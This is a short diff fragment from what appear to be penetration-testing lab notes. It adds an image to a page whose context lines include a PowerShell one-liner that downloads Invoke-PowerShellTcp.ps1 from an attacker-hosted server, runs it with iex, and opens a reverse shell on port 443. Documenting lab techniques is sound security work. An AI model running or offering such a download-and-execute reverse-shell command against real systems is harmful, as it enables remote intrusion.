@@ -103,3 +103,5 @@ We then launch our hfs server (could work with python server, upload the invoke 
 ```
 powershell.exe iex (iwr http://172.16.100.13/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.13 -Port 443 
 ```
+
+<figure><img src="../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>
